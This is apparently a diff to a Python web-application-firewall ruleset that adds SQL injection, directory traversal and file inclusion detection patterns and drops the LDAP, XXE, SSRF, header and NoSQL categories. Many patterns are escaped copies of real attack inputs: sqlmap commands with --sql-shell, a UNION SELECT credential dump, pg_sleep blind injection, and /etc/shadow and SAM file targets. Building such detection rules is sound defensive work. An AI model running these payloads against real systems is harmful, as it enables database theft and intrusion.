+        r"(?i)\\-\\-proxy=\"socks5://\\[username\\]:\\[password\\]@\\[proxy_ip\\]:\\[proxy_port\\]\"",
+        r"(?i)\\|\\ `select\\ \\*\\ from\\ project_id\\.dataset_name\\.table_name`\\ \\ \\ \\ \\|\\ Gathering\\ data\\ from\\ specific\\ project\\ id\\ \\&\\ dataset\\ \\|",
+        r"(?i)sqlmap\\ \\-r\\ /tmp/r\\.txt\\ \\-\\-dbms\\ MySQL\\ \\-\\-second\\-order\\ \"http://targetapp/wishlist\"\\ \\-v\\ 3",
+        r"(?i)sqlmap\\ \\-u\\ \"http://example\\.com\"\\ \\-\\-data\\ \"username=admin\\&password=pass\"\\ \\ \\-\\-headers=\"x\\-forwarded\\-for:127\\.0\\.0\\.1\\*\"",
+        r"(?i)\\#\\#\\ BigQuery\\ Union\\ Based",
+        r"(?i)1'\\ UNION\\ SELECT\\ username,\\ password\\ FROM\\ users\\ \\-\\-",
+        r"(?i)sqlmap\\ \\-r\\ request\\.txt",
+        r"(?i)\\-\\-proxy=\"socks4://\\[username\\]:\\[password\\]@\\[proxy_ip\\]:\\[proxy_port\\]\"",
+        r"(?i)SELECT\\ database_to_xml\\(true,true,''\\);\\ \\-\\-\\ dump\\ the\\ current\\ database\\ to\\ XML",
+        r"(?i)select\\ case\\ when\\ substring\\(column,1,1\\)='1'\\ then\\ pg_sleep\\(5\\)\\ else\\ pg_sleep\\(0\\)\\ end\\ from\\ table_name\\ where\\ column_name='value'\\ limit\\ 1",
+        r"(?i)sqlmap\\ \\-u\\ \"http://example\\.com/\\?id=1\"\\ \\ \\-p\\ id\\ \\-\\-sql\\-shell",
+        r"(?i)page\\.asp\\?id=1\"\\ or\\ 1=1\\ \\-\\-\\ true",
+        r"(?i)END;",
     ],
-    
-    "LDAP Injection": [
-        # LDAP filter manipulation
-        r"(\(\s*[|&]\s*\()",
-        r"(\)\s*\(\s*[|&])",
-        r"(\*\s*\)\s*\()",
-        r"(\(\s*\|\s*\(.*\)\s*\))",
+
+    "Directory Traversal": [
+        # Basic Traversal
+        r"\.\./",
+        r"\.\.\\",
+        r"\.\.\.",
+        r"\.\./\.\./",
         
-        # LDAP special characters
-        r"(\(\s*\*\s*\))",
-        r"(~=|>=|<=)",
+        # Encoded Traversal
+        r"%2e%2e/",
+        r"%2e%2e\\",
+        r"%2e%2e%2f",
+        r"%2e%2e%5c",
+        r"\.%2e/",
+        r"%252e%252e",
+        r"%c0%ae",
+        r"%e0%80%ae",
+        
+        # Double Encoding
+        r"%25%32%65%25%32%65",
+        r"%%32%65%%32%65",
+        
+        # Unix Paths
+        r"(?i)/etc/",
+        r"(?i)/var/",
+        r"(?i)/usr/",
+        r"(?i)/proc/",
+        r"(?i)/root/",
+        r"(?i)/home/",
+        
+        # Windows Paths
+        r"(?i)[c-z]:\\",
+        r"(?i)[c-z]:/",
+        r"(?i)windows\\",
+        r"(?i)winnt\\",
+        r"(?i)system32\\",
+        r"(?i)\\windows\\",
+        r"(?i)\\winnt\\",
+        
+        # Sensitive Files
+        r"(?i)/etc/passwd",
+        r"(?i)/etc/shadow",
+        r"(?i)/etc/hosts",
+        r"(?i)c:\\windows\\system32\\config\\sam",
+        r"(?i)c:\\boot\.ini",
+        
+        # Null Byte
+        r"%00",
+        r"\\0",
+        r"\\x00",
+        
+        # Mixed Encodings
+        r"(?i)\.\./\.\./\.\./etc/passwd",
+        r"(?i)\.\.%2f\.\.%2f",
+        r"(?i)%2e%2e%2f%2e%2e%2f",
     ],
-    
-    "XML/XXE Injection": [
-        # External entity
-        r"(?i)(<!ENTITY[^>]+SYSTEM)",
-        r"(?i)(<!ENTITY[^>]+PUBLIC)",
+
+    "File Inclusion": [
+        # Remote File Inclusion (RFI)
+        r"(?i)(http|https|ftp)://[^/]+",
+        r"(?i)\\\\[^\\]+",
         
-        # DOCTYPE declaration
-        r"(?i)(<!DOCTYPE[^>]+\[)",
+        # Local File Inclusion (LFI)
+        r"(?i)file://",
+        r"(?i)php://filter",
+        r"(?i)php://input",
+        r"(?i)php://data",
+        r"(?i)expect://",
+        r"(?i)zip://",
+        r"(?i)compress\.zlib://",
+        r"(?i)compress\.bzip2://",
+        r"(?i)data://",
+        r"(?i)glob://",
+        r"(?i)phar://",
         
-        # Parameter entities
-        r"(?i)(%\w+;)",
+        # PHP Wrappers
+        r"(?i)php://filter/convert\.base64",
+        r"(?i)php://filter/read=",
+        r"(?i)filter:convert\.base64-encode",
         
-        # CDATA abuse
-        r"(?i)(<!\[CDATA\[[\s\S]*?\]\]>)",
-    ],
-    
-    "Server-Side Request Forgery": [
-        # Internal IPs
-        r"(https?:\/\/(127\.0\.0\.1|localhost|0\.0\.0\.0))",
-        r"(https?:\/\/(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.))",
-        r"(https?:\/\/\[::1\])",
+        # Path Manipulation
+        r"(?i)\?file=",
+        r"(?i)\?page=",
+        r"(?i)\?include=",
+        r"(?i)\?path=",
+        r"(?i)\?load=",
         
-        # Cloud metadata
-        r"(?i)(169\.254\.169\.254)",
-        r"(?i)(metadata\.google\.internal)",
-        r"(?i)(instance-data)",
-    ],
-    
-    "HTTP Header Injection": [
-        # CRLF injection
-        r"(%0d%0a|\\r\\n|%0a|\\n)",
-        r"(?i)(Set-Cookie:|Location:|Content-Type:)",
+        # Include with Traversal
+        r"(?i)(\.\./)+(etc|var|usr|proc)/",
+        r"(?i)include(\s)*\(",
+        r"(?i)require(\s)*\(",
+        r"(?i)include_once(\s)*\(",
+        r"(?i)require_once(\s)*\(",
         
-        # Response splitting
-        r"(\r\n\r\n|\n\n)",
-    ],
-    
-    "NoSQL Injection": [
-        # MongoDB
-        r"(?i)(\$ne|\$gt|\$lt|\$gte|\$lte|\$in|\$nin)",
-        r"(?i)(\$where|\$regex|\$exists)",
+        # Log Poisoning
+        r"(?i)/var/log/",
+        r"(?i)access\.log",
+        r"(?i)error\.log",
+        r"(?i)/proc/self/environ",
         
-        # JSON injection
-        r"(?i)(\"\\s*\$ne\\s*\"\\s*:\\s*null)",
+        # Null Byte Injection
+        r"(?i)\?file=[^&]*%00",
+        r"(?i)\?page=[^&]*\\x00",
+        
+        # Common LFI Targets
+        r"(?i)/etc/passwd",
+        r"(?i)/etc/shadow",
+        r"(?i)c:\\windows\\system32",
+        r"(?i)c:\\boot\.ini",
+        
+        # Data URI
+        r"(?i)data:text/html",
+        r"(?i)data:application",
+        
+        # SMB Shares (Windows)
+        r"(?i)\\\\\\\\",
+        r"(?i)file:////",
     ],
 }
-
-
-def get_rule_sources():
-    """Return information about rule sources"""
-    return {
-        "OWASP CRS": "https://github.com/coreruleset/coreruleset",
-        "Cloudflare": "https://github.com/cloudflare/lua-resty-waf",
-        "AWS WAF": "https://docs.aws.amazon.com/waf/latest/developerguide/",
-        "ModSecurity": "https://github.com/SpiderLabs/ModSecurity",
-    }
 
 
 def get_rule_statistics():
@@ -265,17 +603,11 @@ def get_rule_statistics():
 
 if __name__ == "__main__":
     stats = get_rule_statistics()
-    print("=" * 60)
-    print("WAF RULESET STATISTICS")
-    print("=" * 60)
+    print("=" * 70)
+    print("ENHANCED WAF RULESET STATISTICS")
+    print("=" * 70)
     print(f"Total Categories: {stats['total_categories']}")
     print(f"Total Rules: {stats['total_rules']}")
     print("\nRules per category:")
-    for category, count in stats['rules_per_category'].items():
-        print(f"  {category:30s}: {count:3d} rules")
-    
-    print("\n" + "=" * 60)
-    print("SOURCES:")
-    print("=" * 60)
-    for source, url in get_rule_sources().items():
-        print(f"  {source}: {url}")
+    for category, count in sorted(stats['rules_per_category'].items()):
+        print(f"  {category:40s}: {count:4d} rules")
